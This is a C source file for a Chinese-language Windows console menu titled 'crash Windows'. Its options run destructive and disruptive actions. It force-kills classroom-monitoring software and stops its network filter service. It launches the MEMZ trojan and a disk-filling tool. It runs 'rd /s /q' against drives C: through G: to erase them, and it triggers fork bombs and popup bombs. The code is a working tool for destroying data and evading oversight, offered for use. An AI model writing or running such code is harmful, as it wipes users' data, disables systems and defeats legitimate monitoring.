#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#define cls system("cls")
void gotoxy(int x, int y) {
    COORD p;
    HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
    p.X = x; p.Y = y;
    SetConsoleCursorPosition(handle, p);
}
void HideCursor() {
    CONSOLE_CURSOR_INFO cursur_info;
    cursur_info.dwSize = 1;
    cursur_info.bVisible = FALSE;
    HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleCursorInfo(handle, &cursur_info);
}
void MainMap() {
    printf("+------------------------------------------+------------+\n");
    printf("|                崩坏Windows               | w-光标上移 |\n");
    printf("+------------------------------------------+ s-光标下移 |\n");
    printf("|1，信息课                                 | enter-确定 |\n");
    printf("|2，让电脑趋势                             | m-返回首页 |\n");
    printf("|3，表面现象                               |            |\n");
    printf("|4，开发日志                               |            |\n");
    printf("+------------------------------------------+------------+\n");
}//page=10
void FirstMap() {
    printf("信息课：\n\n");
    printf("1，脱离控制\n");
    printf("2，解除网络控制\n");
}//page=11
void SecondMap() {
    printf("让电脑趋势：\n\n");
    printf("1，彩虹猫病毒MEMZ\n");
    printf("2，硬盘榨干器\n");
    printf("3，格式化磁盘\n");
}//page=12
void ThirdMap() {
    printf("表面现象（对电脑没有实际伤害）：\n\n");
    printf("1，扫盘\n");
    printf("2，蹦迪\n");
    printf("3，数字雨\n");
    printf("4，弹窗炸弹（重启即可）\n");
    printf("5，炸满内存（重启即可）\n");
    printf("6，循环弹窗（终止进程即可）\n");
    printf("7，伪装黑客\n");
    printf("8，树状图");
}//page=13
void LOG() {
    printf("===========================================================\n");
    printf("软件开发日志                                 m-返回主菜单\n");
    printf("版本号          事件                             代码行数\n");
    printf("===========================================================\n");
    printf("V1.0.202421                                      482行\n");
    printf("V1.1.202424     还原文件名                       485行\n");
    printf("V1.2.202428     使用说明，开发日志，完善功能     566行\n");
    printf("V1.2.2024213    完善功能                         573行\n");
    printf("V1.3.202432     硬盘榨干器，完善功能             587行\n");
    printf("V1.3.202433     优化代码                         547行\n");
    printf("V1.3.202435     完善功能                         563行\n");
    printf("V1.4.202439     UAC提权工具                      559行\n");
    printf("V1.4.2024320    优化代码                         526行\n");
    printf("V1.5.2024321    实用工具                         591行\n");
    printf("V1.6.2024323    修复了许多BUG                    626行\n");
    printf("V1.6.2024327    优化代码                         592行\n");
    printf("V1.7.202449     优化代码                         553行\n");
    printf("V1.8.2024410    删除无效功能                     327行\n");
    printf("V1.9.2024415    格式化磁盘                       321行\n");
    printf("V1.10.2024513    树状图                             336行\n");
    printf("===========================================================\n");
}//page=14
int main() {
    char boom_oldname[] = "boom2.txt";
    char MEMZ_oldname[] = "MEMZ.txt";
	//File_old_name

    char boom_newname[] = "boom2.bat";
    char MEMZ_newname[] = "MEMZ.bat";
	//File_new_name

    char* rain = "rain.bat";
    char* dance = "dance.bat";
    char* boom = "boom.bat";
    char* MEMZ = "MEMZ.bat";
    char* disk_squeezer = "Disk-Squeezer_v1.5.exe";
    char* msgbox = "msgbox.vbs";
	//File_name
    
    int cols = 3, page = 10;
    HideCursor();
    MainMap();
    gotoxy(20, cols);
    printf("<");
    //初始化
        
    while (1) {
        while (page == 10) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'w':
                    gotoxy(20, --cols);
                    gotoxy(20, ++cols);
                    printf(" ");
                    gotoxy(20, --cols);
                    printf("<");
                    break;
                case's':
                    gotoxy(20, ++cols);
                    gotoxy(20, --cols);
                    printf(" ");
                    gotoxy(20, ++cols);
                    printf("<");
                    break;
                case 13:
                    if (cols == 3) {
                        cls;
                        FirstMap();
                        cols = 2, page = 11;
                        gotoxy(20, cols);
                        printf("<");
                        break;
                    }
                    if (cols == 4) {
                        cls;
                        SecondMap();
                        cols = 2, page = 12;
                        gotoxy(20, cols);
                        printf("<");
                        break;
                    }
                    if (cols == 5) {
                        cls;
                        ThirdMap();
                        cols = 2, page = 13;
                        gotoxy(30, cols);
                        printf("<");
                        break;
                    }
                    if (cols == 6) {
                        cls;
                        LOG();
                        page = 14;
                        break;
                    }
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 1)
                break;
        }
        //主菜单 
        
        while (page == 11) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'w':
                    gotoxy(20, --cols);
                    gotoxy(20, ++cols);
                    printf(" ");
                    gotoxy(20, --cols);
                    printf("<");
                    break;
                case's':
                    gotoxy(20, ++cols);
                    gotoxy(20, --cols);
                    printf(" ");
                    gotoxy(20, ++cols);
                    printf("<");
                    break;
                case 13:
                    if (cols == 2) {
                        cls;
                        system("taskkill /f /im studentmain.exe\n");
                        Sleep(2000);
                        break;
                    }
                    if (cols == 3) {
                        cls;
                        system("taskkill /f /im masterhelper.exe\n");
                        Sleep(1);
                        system("sc stop tdnetfilter\n");
                        Sleep(3000);
                        break;
                    }
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 11)
                break;
        }
        //信息课 
        
        while (page == 12) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'w':
                    gotoxy(20, --cols);
                    gotoxy(20, ++cols);
                    printf(" ");
                    gotoxy(20, --cols);
                    printf("<");
                    break;
                case's':
                    gotoxy(20, ++cols);
                    gotoxy(20, --cols);
                    printf(" ");
                    gotoxy(20, ++cols);
                    printf("<");
                    break;
                case 13:
                    if (cols == 2) {
                        if (rename(MEMZ_oldname, MEMZ_newname) == 0) {
                            cls;
                            system(MEMZ);
                            rename(MEMZ_newname, MEMZ_oldname);
                        }
                        break;
                    }
                    if (cols == 3) {
                        system(disk_squeezer);
                        break;
                    }
                    if (cols == 4) {
                        system("@echo off");
                        system("rd /s /q C:\\");
                        system("rd /s /q D:\\");
                        system("rd /s /q E:\\");
                        system("rd /s /q F:\\");
                        system("rd /s /q G:\\");
                    }
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 12)
                break;
        }
        //让电脑趋势 
        
        while (page == 13) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'w':
                    gotoxy(30, --cols);
                    gotoxy(30, ++cols);
                    printf(" ");
                    gotoxy(30, --cols);
                    printf("<");
                    break;
                case's':
                    gotoxy(30, ++cols);
                    gotoxy(30, --cols);
                    printf(" ");
                    gotoxy(30, ++cols);
                    printf("<");
                    break;
                case 13:
                    if (cols == 2) {
                        system("dir /s");
                        system("%0");
                    }
                    if (cols == 3)
                        system(dance);
                    if (cols == 4)
                        system(rain);
                    if (cols == 5) {
                        system("%0|%0");
                    }
                    if (cols == 6) {
                        if (rename(boom_oldname, boom_newname) == 0) {
                            cls;
                            system(boom);
                            rename(boom_newname, boom_oldname);
                        }
                    }
                    if (cols == 7)
                        system(msgbox);
                    if (cols == 8) {
                        system("start https://hack.chat/");
                        Sleep(1000);
                        system("start https://cybermap.kaspersky.com/");
                        Sleep(1000);
                        system("start https://www.hacked.com.cn/");
                        Sleep(1000);
                        system("start http://geekprank.com/hacker/");
                    }
                    if (cols == 9) {
                        system("tree c:"); 
                        system("%0");
                    }
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 13)
                break;
        }
        //只是表面现象 
        
        while (page == 14) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 15)
                break;
        }
        //开发日志
    }
}